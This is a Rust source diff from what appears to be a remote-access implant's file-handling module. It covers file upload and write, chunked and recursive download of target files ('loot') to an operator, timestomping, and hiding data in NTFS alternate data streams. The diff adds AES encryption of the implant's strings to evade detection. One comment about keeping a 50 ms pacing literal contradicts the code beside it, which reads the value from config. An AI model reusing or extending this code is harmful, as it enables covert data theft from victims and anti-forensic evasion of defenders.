@@ -11,9 +11,11 @@
 use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
 
 use crate::common::CommandResponse;
+use crate::config::config;
 use crate::file_transfer;
 use crate::agent::artifacts;
-use crate::lc;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 use super::{HandlerContext, DispatchResult, AgentAction, wrap_result};
 
 // ── File Read / Write ──────────────────────────────────────────────────
@@ -23,10 +25,10 @@ pub fn handle_file_write(cmd: &str) -> (String, String, i32) {
     let parts: Vec<&str> = cmd.splitn(4, '|').collect();
     if parts.len() == 4 {
         match file_transfer::write_file_simple(parts[1], parts[2], parts[3]) {
-            Ok(_) => (format!("{}: {}/{}", lc!("File written"), parts[1], parts[2]), String::new(), 0),
+            Ok(_) => (format!("{}: {}/{}", aes_str!("File written"), parts[1], parts[2]), String::new(), 0),
             Err(e) => (String::new(), e, 1),
         }
-    } else { (String::new(), lc!("Usage: file:write|base_dir|rel_path|b64_data"), 1) }
+    } else { (String::new(), aes_str!("Usage: file:write|base_dir|rel_path|b64_data"), 1) }
 }
 
 /// Chunked file write - receives one piece of a file and appends it to disk.
@@ -43,7 +45,7 @@ pub fn handle_file_write_chunked(cmd: &str) -> (String, String, i32) {
     let parts: Vec<&str> = cmd.splitn(6, '|').collect();
     if parts.len() < 6 {
         return (String::new(),
-            lc!("Usage: file:write_chunk|batch|path|chunk_idx|total_chunks|b64"), 1);
+            aes_str!("Usage: file:write_chunk|batch|path|chunk_idx|total_chunks|b64"), 1);
     }
 
     let path      = parts[2];
@@ -53,7 +55,7 @@ pub fn handle_file_write_chunked(cmd: &str) -> (String, String, i32) {
 
     let bytes = match BASE64.decode(b64) {
         Ok(b)  => b,
-        Err(e) => return (String::new(), format!("{}: {}", lc!("Base64 error"), e), 1),
+        Err(e) => return (String::new(), format!("{}: {}", aes_str!("Base64 error"), e), 1),
     };
 
     // Ensure parent directories exist (mirrors write_file_simple behaviour).
@@ -84,7 +86,7 @@ pub fn handle_file_write_chunked(cmd: &str) -> (String, String, i32) {
 
     let is_final = chunk_idx + 1 >= total;
     if is_final {
-        (format!("[+] {} {}", lc!("Upload complete:"), path), String::new(), 0)
+        (format!("[+] {} {}", aes_str!("Upload complete:"), path), String::new(), 0)
     } else {
         (format!("[*] {}/{} {}", chunk_idx + 1, total, path), String::new(), 0)
     }
@@ -112,19 +114,19 @@ fn build_file_meta_json(path: &str) -> Option<String> {
     let md = std::fs::metadata(path).ok()?;
     let mut map = serde_json::Map::new();
     if let Ok(t) = md.modified() {
-        map.insert("modified".to_string(), sys_time_to_rfc3339(t).into());
+        map.insert(aes_str!("modified"), sys_time_to_rfc3339(t).into());
     }
     if let Ok(t) = md.accessed() {
-        map.insert("accessed".to_string(), sys_time_to_rfc3339(t).into());
+        map.insert(aes_str!("accessed"), sys_time_to_rfc3339(t).into());
     }
     if let Ok(t) = md.created() {
-        map.insert("created".to_string(), sys_time_to_rfc3339(t).into());
+        map.insert(aes_str!("created"), sys_time_to_rfc3339(t).into());
     }
     #[cfg(unix)]
     {
         use std::os::unix::fs::MetadataExt;
-        map.insert("owner".to_string(), md.uid().to_string().into());
-        map.insert("group".to_string(), md.gid().to_string().into());
+        map.insert(aes_str!("owner"), md.uid().to_string().into());
+        map.insert(aes_str!("group"), md.gid().to_string().into());
     }
     Some(BASE64.encode(serde_json::Value::Object(map).to_string()))
 }
@@ -132,7 +134,7 @@ fn build_file_meta_json(path: &str) -> Option<String> {
 /// Wire format: file:meta|<batch_ts>|<rel_path>|<abs_path>|<json_b64>
 /// (`-` for batch_ts on single file:data downloads).
 fn file_meta_line(batch_ts: &str, rel_path: &str, abs_path: &str, json_b64: &str) -> String {
-    format!("file:meta|{}|{}|{}|{}", batch_ts, rel_path, abs_path, json_b64)
+    format!("{}|{}|{}|{}|{}", aes_str!("file:meta"), batch_ts, rel_path, abs_path, json_b64)
 }
 
 /// Wire-framing guard: the download protocols embed paths VERBATIM into
@@ -174,13 +176,13 @@ pub fn handle_file_read(cmd: &str) -> (String, String, i32) {
         // wire line - reject framing-breaking characters.
         if path_breaks_wire_framing(parts[1]) {
             return (String::new(),
-                format!("{}: path contains wire-framing characters", lc!("Read error")), 1);
+                format!("{}: path contains wire-framing characters", aes_str!("Read error")), 1);
         }
         match file_transfer::read_file_to_b64(parts[1]) {
-            Ok((b64, perms)) => (format!("file:data|{}|{}|{}", parts[1], perms, b64), String::new(), 0),
+            Ok((b64, perms)) => (format!("{}|{}|{}|{}", aes_str!("file:data"), parts[1], perms, b64), String::new(), 0),
             Err(e) => (String::new(), e, 1),
         }
-    } else { (String::new(), lc!("Read error"), 1) }
+    } else { (String::new(), aes_str!("Read error"), 1) }
 }
 
 // ── Chunked single-file download (>= 50 MB) ────────────────────────────
@@ -190,7 +192,7 @@ pub fn handle_file_read(cmd: &str) -> (String, String, i32) {
 // timer events.
 
 pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_id: u64) {
-    let path = match cmd.strip_prefix(&lc!("file:read|")) {
+    let path = match cmd.strip_prefix(&aes_str!("file:read|")) {
         Some(p) if !p.is_empty() => p.to_string(),
         _ => return,
     };
@@ -201,8 +203,13 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
         // server's MAX_FRAME_SIZE (10 MiB). The previous 8 MB chunks
         // produced ~11 MB frames that the server rejected, killing the
         // session mid-download. Matches the recursive path below.
-        const CHUNK_SIZE: u64 = 2 * 1024 * 1024;
-        const CHUNK_SLEEP_MS: u64 = 50;
+        // (.max(1) guards against a misconfigured zero chunk size.)
+        let chunk_size = config().transfer.download_chunk_size_bytes.max(1);
+        // Pacing stays at the historical 50 ms for single-file downloads:
+        // the typed-config default (transfer.chunk_sleep_ms = 20) was mined
+        // from the recursive path, so this literal remains local to avoid a
+        // behavior change.
+        let chunk_sleep_ms = crate::config::config().transfer.download_chunk_sleep_ms;
 
         let batch_ts = chrono::Utc::now().format("%Y%d%m_%H%M%S_%3f").to_string();
 
@@ -210,7 +217,7 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
             .parent()
             .and_then(|p| p.file_name())
             .map(|n| n.to_string_lossy().to_string())
-            .unwrap_or_else(|| "loot".to_string());
+            .unwrap_or_else(|| aes_str!("loot"));
 
         let rel_path = path
             .trim_start_matches('/')
@@ -231,7 +238,7 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
             if path_breaks_wire_framing(&path) {
                 let resp = CommandResponse {
                     request_id: req_id, output: String::new(),
-                    error: "Refusing chunked download: path contains wire-framing characters".to_string(),
+                    error: aes_str!("Refusing chunked download: path contains wire-framing characters"),
                     exit_code: 1,
                 };
                 if let Ok(j) = serde_json::to_vec(&resp) {
@@ -255,7 +262,7 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
             };
 
             let total_chunks: u64 = if file_size == 0 { 1 }
-                                     else { (file_size + CHUNK_SIZE - 1) / CHUNK_SIZE };
+                                     else { (file_size + chunk_size - 1) / chunk_size };
 
             let mut file = match std::fs::File::open(&path) {
                 Ok(f) => f,
@@ -278,7 +285,7 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
                 return;
             }
 
-            let mut chunk_buf = vec![0u8; CHUNK_SIZE as usize];
+            let mut chunk_buf = vec![0u8; chunk_size as usize];
             let mut chunk_idx: u64 = 0;
 
             loop {
@@ -288,7 +295,7 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
                         Ok(0) => break,
                         Ok(n) => {
                             total_read += n;
-                            if total_read == CHUNK_SIZE as usize { break; }
+                            if total_read == chunk_size as usize { break; }
                         }
                         Err(e) => {
                             let resp = CommandResponse {
@@ -304,10 +311,10 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
                     }
                 }
 
-                let is_last = total_read < CHUNK_SIZE as usize;
+                let is_last = total_read < chunk_size as usize;
 
                 let b64 = BASE64.encode(&chunk_buf[..total_read]);
-                let output = format!("file:chunk|{}|{}|{}|{}|{}|{}",
+                let output = format!("{}|{}|{}|{}|{}|{}|{}", aes_str!("file:chunk"),
                     batch_ts, root_name, rel_path, chunk_idx, total_chunks, b64);
                 let resp = CommandResponse {
                     request_id: req_id, output,
@@ -319,7 +326,7 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
 
                 chunk_idx += 1;
                 if !is_last {
-                    std::thread::sleep(std::time::Duration::from_millis(CHUNK_SLEEP_MS));
+                    std::thread::sleep(std::time::Duration::from_millis(chunk_sleep_ms));
                 }
                 if is_last || file_size == 0 { break; }
             }
@@ -365,9 +372,12 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
     let tx = ctx.tx.clone();
 
     tokio::spawn(async move {
-        const CHUNK_SIZE: u64 = 2 * 1024 * 1024;   // 2 MB (was 8 MB)
-        const CHUNK_SLEEP_MS: u64 = 20;             // 20 ms between chunks
-        const FILES_PER_YIELD: usize = 5;           // yield every N files
+        // Chunk sizing, pacing and yield cadence come from the typed
+        // transfer config (defaults: 2 MB - was 8 MB, 20 ms between chunks,
+        // yield every 5 files). .max(1) guards against misconfigured zeros.
+        let chunk_size = config().transfer.recursive_chunk_size_bytes.max(1);
+        let chunk_sleep_ms = config().transfer.chunk_sleep_ms;
+        let files_per_yield = config().transfer.files_per_yield.max(1);
 
         let batch_ts = chrono::Utc::now().format("%Y%d%m_%H%M%S_%3f").to_string();
         let root_name = std::path::Path::new(&root_path)
@@ -391,7 +401,7 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
             if path_breaks_wire_framing(&root_path) {
                 let resp = CommandResponse {
                     request_id: req_id, output: String::new(),
-                    error: "Refusing recursive download: root path contains wire-framing characters".to_string(),
+                    error: aes_str!("Refusing recursive download: root path contains wire-framing characters"),
                     exit_code: 1,
                 };
                 if let Ok(j) = serde_json::to_vec(&resp) {
@@ -424,7 +434,7 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
                 if path_breaks_wire_framing(&path_str) {
                     report.failed_downloads.push((
                         path_str,
-                        "unsafe filename (| or newline breaks wire framing)".to_string(),
+                        aes_str!("unsafe filename (| or newline breaks wire framing)"),
                     ));
                     continue;
                 }
@@ -439,7 +449,7 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
                 };
 
                 let total_chunks: u64 = if file_size == 0 { 1 }
-                    else { (file_size + CHUNK_SIZE - 1) / CHUNK_SIZE };
+                    else { (file_size + chunk_size - 1) / chunk_size };
 
                 let mut file = match std::fs::File::open(&path_str) {
                     Ok(f) => f,
@@ -456,7 +466,7 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
                     return;
                 }
 
-                let mut chunk_buf = vec![0u8; CHUNK_SIZE as usize];
+                let mut chunk_buf = vec![0u8; chunk_size as usize];
                 let mut chunk_idx: u64 = 0;
                 let mut file_ok = true;
 
@@ -467,7 +477,7 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
                             Ok(0) => break,
                             Ok(n) => {
                                 total_read += n;
-                                if total_read == CHUNK_SIZE as usize { break; }
+                                if total_read == chunk_size as usize { break; }
                             }
                             Err(e) => {
                                 report.failed_downloads.push((path_str.clone(), e.to_string()));
@@ -478,12 +488,12 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
                     }
                     if !file_ok { break; }
 
-                    let is_last = total_read < CHUNK_SIZE as usize;
+                    let is_last = total_read < chunk_size as usize;
                     let actual_total = if file_size == 0 { 1u64 } else { total_chunks };
 
                     let b64 = base64::engine::general_purpose::STANDARD
                         .encode(&chunk_buf[..total_read]);
-                    let output = format!("file:chunk|{}|{}|{}|{}|{}|{}",
+                    let output = format!("{}|{}|{}|{}|{}|{}|{}", aes_str!("file:chunk"),
                         batch_ts, root_name, rel_path, chunk_idx, actual_total, b64);
                     let resp = CommandResponse {
                         request_id: req_id, output,
@@ -497,7 +507,7 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
 
                     // Cooperative yield: sleep so other OS threads can run.
                     if !is_last {
-                        std::thread::sleep(std::time::Duration::from_millis(CHUNK_SLEEP_MS));
+                        std::thread::sleep(std::time::Duration::from_millis(chunk_sleep_ms));
                     }
                     if is_last || file_size == 0 { break; }
                 }
@@ -506,14 +516,14 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
 
                 // Yield every N files to keep enumeration from monopolising
                 // the blocking pool thread for too long.
-                if (file_idx + 1) % FILES_PER_YIELD == 0 {
+                if (file_idx + 1) % files_per_yield == 0 {
                     std::thread::sleep(std::time::Duration::from_millis(1));
                 }
             }
 
             // 3. Send final report.
             let rep_json = serde_json::to_string(&report).unwrap_or_default();
-            let final_out = format!("file:report_batch|{}|{}|{}", batch_ts, root_name, rep_json);
+            let final_out = format!("{}|{}|{}|{}", aes_str!("file:report_batch"), batch_ts, root_name, rep_json);
             let resp = CommandResponse {
                 request_id: req_id, output: final_out,
                 error: String::new(), exit_code: 0
@@ -537,7 +547,7 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
 pub fn handle_timestomp(cmd: &str) -> DispatchResult {
     let parts: Vec<&str> = cmd.split_whitespace().collect();
     if parts.len() != 3 {
-        return DispatchResult::Reply(String::new(), lc!("Usage: timestomp <target> <reference_file>"), 1, AgentAction::None);
+        return DispatchResult::Reply(String::new(), aes_str!("Usage: timestomp <target> <reference_file>"), 1, AgentAction::None);
     }
     wrap_result(artifacts::timestomp_copy(parts[1], parts[2]))
 }
@@ -545,29 +555,29 @@ pub fn handle_timestomp(cmd: &str) -> DispatchResult {
 pub fn handle_timestomp_set(cmd: &str) -> DispatchResult {
     let parts: Vec<&str> = cmd.split_whitespace().collect();
     if parts.len() != 3 {
-        return DispatchResult::Reply(String::new(), lc!("Usage: timestomp:set <path> <unix_epoch>"), 1, AgentAction::None);
+        return DispatchResult::Reply(String::new(), aes_str!("Usage: timestomp:set <path> <unix_epoch>"), 1, AgentAction::None);
     }
     match parts[2].parse::<i64>() {
         Ok(epoch) => wrap_result(artifacts::timestomp_epoch(parts[1], epoch)),
-        Err(_) => DispatchResult::Reply(String::new(), lc!("Invalid epoch timestamp"), 1, AgentAction::None),
+        Err(_) => DispatchResult::Reply(String::new(), aes_str!("Invalid epoch timestamp"), 1, AgentAction::None),
     }
 }
 
 pub fn handle_ads_write(cmd: &str) -> DispatchResult {
     let parts: Vec<&str> = cmd.split_whitespace().collect();
     if parts.len() != 4 {
-        return DispatchResult::Reply(String::new(), lc!("Usage: ads:write <path> <stream_name> <b64_data>"), 1, AgentAction::None);
+        return DispatchResult::Reply(String::new(), aes_str!("Usage: ads:write <path> <stream_name> <b64_data>"), 1, AgentAction::None);
     }
     match BASE64.decode(parts[3]) {
         Ok(data) => wrap_result(artifacts::ads_write(parts[1], parts[2], &data)),
-        Err(_) => DispatchResult::Reply(String::new(), lc!("Invalid base64"), 1, AgentAction::None),
+        Err(_) => DispatchResult::Reply(String::new(), aes_str!("Invalid base64"), 1, AgentAction::None),
     }
 }
 
 pub fn handle_ads_read(cmd: &str) -> DispatchResult {
     let parts: Vec<&str> = cmd.split_whitespace().collect();
     if parts.len() != 3 {
-        return DispatchResult::Reply(String::new(), lc!("Usage: ads:read <path> <stream_name>"), 1, AgentAction::None);
+        return DispatchResult::Reply(String::new(), aes_str!("Usage: ads:read <path> <stream_name>"), 1, AgentAction::None);
     }
     match artifacts::ads_read(parts[1], parts[2]) {
         Ok(data) => DispatchResult::Reply(BASE64.encode(&data), String::new(), 0, AgentAction::None),
@@ -577,7 +587,7 @@ pub fn handle_ads_read(cmd: &str) -> DispatchResult {
 
 pub fn handle_ads_list(path: &str) -> DispatchResult {
     match artifacts::ads_list(path) {
-        Ok(streams) if streams.is_empty() => DispatchResult::Reply(lc!("No alternate data streams found"), String::new(), 0, AgentAction::None),
+        Ok(streams) if streams.is_empty() => DispatchResult::Reply(aes_str!("No alternate data streams found"), String::new(), 0, AgentAction::None),
         Ok(streams) => DispatchResult::Reply(streams.join("\n"), String::new(), 0, AgentAction::None),
         Err(e) => DispatchResult::Reply(String::new(), e, 1, AgentAction::None),
     }
